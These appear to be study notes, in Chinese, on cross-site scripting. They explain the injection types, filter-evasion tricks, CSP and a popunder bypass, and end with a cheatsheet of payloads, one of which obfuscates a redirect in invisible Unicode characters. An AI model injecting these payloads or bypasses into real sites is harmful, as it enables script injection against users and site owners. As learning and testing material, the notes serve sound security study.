# Cross-Site Scripting  
[同源策略](https://github.com/shinmao/Web-Security-Learning/blob/master/XSS/Same-Origin%20Policy.md)    
1. reflected xss (非持久型):  
`<?php echo 'xss, '.$_GET['script']; ?>`

2. stored xss (持久型):  
Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內容  
`<?php echo 'xss, '.$DB_value; ?>`

3. DOM xss: 最近の流行り  
通過DOM操作觸發

注意: reflective型 以及 stored型 才會與server有互動，因為server需要解析惡意代碼，而DOM型則是完全由客戶端js執行。  
  
*  [XSS detection](#xss-detection)  
*  [常見限制 and 對抗手勢](#常見限制-and-對抗手勢)  
*  [CSP介紹與繞過](#csp-into-and-bypass)  
*  [正規表達式](#正規表達式)  
*  [攻擊手勢](#攻擊手勢)  
*  [popunder彈窗手勢](#彈窗手勢)  
*  [Cheatsheet](#cheatsheet)    
*  [Reference](#reference)

# XSS detection
這裡先不談XSS探針...  
我習慣直接注入sciprt語句作測試，常見語句如下:  
```js
<script>alert(/1/);<script>
<a href=1 onload=alert(1)>hi</a>
```
在這裏個人認為較重要的是分析注入點對網頁產生的影響，我注入的惡意代碼沒有作用可能有兩種原因：  
1. 網頁不存在可利用的xss漏洞，可能注入點直接將值插入網頁作為內容  
2. 惡意代碼被過濾掉，或者轉譯了 -> 這種情況下就要分析有沒有代替字元來繞過過濾名單，或者繞過轉譯！

# 常見限制 and 對抗手勢
* 大小寫混用  
* toUpperCase()  
```js
İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%c5%bf) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k
```
* 一次過濾繞過  
```php
str_replace('<script>','',$GET['hi'])  //這裏代表hi中的<script>會變空字串
// <scr<script>ipt> 
```  
* 使用正規表達式高效率的過濾  
```php
preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])   // 大寫小寫一次繞過全都會被擋掉
// <img src=1 onerror=alert(1)>
```
* encode 轉譯危險標籤  
  * url encode: `% + ASCII(hex) %3Cscript%3E`  
  * http://www.jsfuck.com/  
  補充js常見處理函式: `escape()/unescape()`, `encodeURL()/decodeURL()`, `encodeURLComponent()/decodeURLComponent()`  
  * html encode
  ```php
  htmlspecialchars($_GET['hi']);  // 會將特殊字元通通轉譯掉 
  // 這種情況下將無法再進行注入
  ```  
  * unicode encode: %u + ASCII(hex)  
  * ascii encode
  ```js
  eval(String.fromCharCode(97,108,101,114,116,40,49,41))
  // <script>alert(1)</script>
  ```
  [Encode_tool](http://monyer.com/demo/monyerjs/)  
  String.fromCharCode() 將unicode字碼轉換成字串 [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
  eval() 執行參數中的js語句 [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
* length limit  
  外部引入自己的js  
* 未過濾`\n`類符號  
```js
<img src="javas
cript:
alert(/1/);">
```
* XSS filters  
* WAF  
* HTML Sanitizer  
* CSP(Content-Security-Policy)  
  這部分內容有點多，我還是獨立出來筆記好了:sweat:

# CSP Intro and bypass
從瀏覽器的層面來防禦漏洞  
主要有兩種 1.限制`js`執行 2. 限制對別的域的請求  
怎麼看一個網站的CSP呢？  
```php
curl -I https://github.com/
// 列出header
// 我們可以看到github已經開啟了XSS-Protection
// 並且也能看到CSP的內容
Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; connect-src 'self' uploads.github.com status.github.com collector.githubapp.com api.github.com www.google-analytics.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com wss://live.github.com; font-src assets-cdn.github.com; form-action 'self' github.com gist.github.com; frame-ancestors 'none'; frame-src render.githubusercontent.com; img-src 'self' data: assets-cdn.github.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com *.githubusercontent.com; manifest-src 'self'; media-src 'none'; script-src assets-cdn.github.com; style-src 'unsafe-inline' assets-cdn.github.com
```

# 正規表達式
js中會用正規表達式來過濾危險字符  
```js
/g -> 全局匹配
/i -> case insensitive
```
參考如下文件：  
[Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)

# 攻擊手勢  
* 不同的`<tag>`做利用  
```js
// script
<script>a=prompt;a(1)</script>

// img
<img src=1 onmouseover=alert(1)>
<img src=1 onerror=confirm(1)>
<img src="javascript:alert(1);">

// svg
<svg/onload=alert(1)>

// body
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29’;>   
// 這種payload也可以繞過括號過濾
```
* DOM based XSS  
```js
<script>document.getElementById("contents").innerHTML=location.hash.substring(1);</script>
// #之後的內容不會被傳送到server端
```
* bootstrap data-* 屬性  
```js
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<button data-toggle="collapse" data-target="<img src=x onerror=alert(0)>">Test</button>

// 關於這個漏洞的解釋issue中有一個評論很清楚
<button data-toggle="collapse" data-target="<?=htmlspecialchars($_GET['x']);?>">Test</button>
// 雖然有參數可控但是htmlspecialchar轉義，這本該是安全的，但是會在bootstrap環境下data-target的屬性中觸發
```
值得注意的是`data-target`本身不會造成xss漏洞，而是被帶到boostrap的環境下發揮效用的！  
[XSS in data-target attribute #20184](https://github.com/twbs/bootstrap/issues/20184)  
* Vue.js


# 彈窗手勢
現在大部分的瀏覽器都禁止未禁用戶允許的彈窗了  
@MasatoKinugawa 發現一個bypass限制的技巧：  
```js
<script>
onkeydown=function(){
    window.open('//example.com/','_blank','a');
}
onkeypress=function(){
    window.open('about:blank','_blank').close();
}
```
以上效果可瀏覽 https://vulnerabledoma.in/popunder/keyevent.html  
[Popunder restriction bypass with keydown and keypress event](https://bugs.chromium.org/p/chromium/issues/detail?id=836841)

# Cheatsheet
```php
</script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>         // 協議解析
</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
"><script>al\u0065rt(document.domain)</script>
"><script>al\u{65}rt(document.domain)</script>
"><img src=x onerror=prompt(1)>
"><svg/onload=prompt(1)>
"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>

// document.write take multiple arguments
document.write("<s","crip","t>al","ert(","1)","</s","cript>")

// Unicode-based
location='http://\u{e01cc}\u{e01cd}\u{e01ce}\u{e01cf}\u{e01d0}\u{e01d1}\u{e01d2}\u{e01d3}\u{e01d4}\u{e01d5}google\u{e01da}\u{e01db}\u{e01dc}\u{e01dd}\u{e01de}\u{e01df}.com'

// redirection
atob.constructor(unescape([...escape((𐑬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄽󠄧󠅨󠅴󠅴󠅰󠄺󠄯󠄯󠅩󠅢󠅭󠄮󠅣󠅯󠅭󠄧=ﾠ=>ﾠ).name)].filter((ﾠ,ㅤ)=>ㅤ%12<1|ㅤ%12>9).join([])))()
```
上面的cheatsheet除了有brutexss原有的payload還有一些自己蒐集的!  
[Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  

# Reference
1. The Web Application Hacker's Handbook  
2. [看雪](https://www.kanxue.com)  
3. [烏雲](http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)  
4. [云淡风轻](http://blog.idhyt.com/2014/10/15/technic-xss-bypass/)  
5. [freebuf](http://www.freebuf.com/articles/web/153055.html)  
6. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)  
7. [PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  
